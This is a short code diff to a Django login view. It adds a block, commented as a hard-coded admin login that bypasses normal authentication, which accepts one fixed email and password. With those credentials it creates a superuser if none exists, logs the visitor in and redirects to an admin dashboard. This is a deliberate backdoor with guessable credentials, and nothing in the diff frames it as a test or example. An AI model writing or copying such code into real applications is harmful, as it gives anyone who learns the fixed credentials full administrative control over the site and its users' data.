@@ -625,6 +625,30 @@ def login_view(request):
             email = form.cleaned_data.get("email")
             password = form.cleaned_data.get("password")
 
+            # 🔥 HARD-CODED ADMIN LOGIN (bypass normal auth)
+            if email == "admin@gmail.com" and password == "admin@2001":
+                from django.contrib.auth import get_user_model, login
+                User = get_user_model()
+
+                user = User.objects.filter(email=email).first()
+
+                if not user:
+                    user = User.objects.create_superuser(
+                        email=email,
+                        password=password
+                    )
+
+                login(request, user)
+
+                if is_ajax:
+                    return JsonResponse({
+                        "success": True,
+                        "redirect": "/admin-dashboard/"
+                    })
+
+                return redirect("/admin-dashboard/")
+
+            # normal authentication flow
             user = authenticate(request, username=email, password=password)
 
             if user is not None:
